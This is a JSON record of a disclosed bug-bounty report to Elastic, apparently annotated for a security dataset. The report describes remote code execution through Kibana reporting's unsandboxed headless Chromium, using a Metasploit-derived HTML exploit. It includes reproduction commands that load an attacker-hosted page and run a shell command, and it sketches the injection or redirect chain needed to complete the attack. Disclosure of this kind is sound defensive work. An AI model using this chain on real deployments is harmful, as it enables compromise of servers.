{
  "reported_to": "Elastic",
  "reported_by": "alexbrasetvik ",
  "title": "RCE hazard in reporting (via Chromium)",
  "content": "\nSummary: Reporting embeds a Chromium that is susceptible to RCEs\nDescription:\nReporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with --no-sandbox to work at all.\nThere are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.\nAttached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53\nI have not been able to devise a complete chain yet (thus the \"hazard\"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.\nSteps To Reproduce:\nHost the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html\nPoint the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)\nHere's an example. The attached HTML file gets uname -a > /tmp/alexb-says-hi to be run:\nCode 924 Bytes\n1$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  \n2bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/\n3bash-4.4$ ls /tmp/\n4ks-script-esd4my7v  ks-script-eusq_sc5\n5bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html\n6[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n7[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n8[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n9[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale\n10^C # CTRL-C after a few seconds. Reporting would kill it after a timeout\n11bash-4.4$ ls /tmp/\n12alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5\n13bash-4.4$ cat /tmp/alexb-says-hi\n14Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\nSupporting Material/References:\nHTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)\nImpact\nKibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 10000,
  "weaknesses": [
    "Privilege Escalation"
  ],
  "screenshots": {},
  "disclosed_date": 1622055120,
  "report_url": "https://hackerone.com/reports/1168765",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Host the malicious HTML file on a server accessible by the target system"
    ],
    [
      2,
      "Configure Kibana's reporting feature to use the headless Chromium with --no-sandbox flag"
    ],
    [
      3,
      "Point the reporting feature to the hosted malicious HTML file"
    ],
    [
      4,
      "Observe the execution of arbitrary commands on the system"
    ]
  ],
  "vuln_description": "The vulnerability involves Kibana's reporting feature using a headless Chromium instance with the --no-sandbox flag, making it susceptible to Remote Code Execution (RCE) if an attacker can control the JavaScript executed by Chromium. This could be achieved through HTML injection, XSS, or open redirect vulnerabilities in Kibana.",
  "reason": "The attack requires understanding of Chromium's sandboxing mechanisms, the implications of the --no-sandbox flag, and how to craft malicious JavaScript to exploit this configuration. Additionally, the attacker needs to find a way to inject or redirect to their malicious content within Kibana's context, which adds to the complexity.",
  "new_complexity": "HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves an RCE hazard in reporting via Chromium, which is not directly related to authentication or authorization bypass. The methodology described focuses on detecting IDOR and AuthN/AuthZ bypass vulnerabilities by swapping user sessions and resource IDs within the same application. The RCE hazard in reporting is a different class of vulnerability that involves exploiting Chromium's --no-sandbox flag and potential HTML/JS injection, which is not covered by the described methodology.",
    "is_detectable": false
  }
}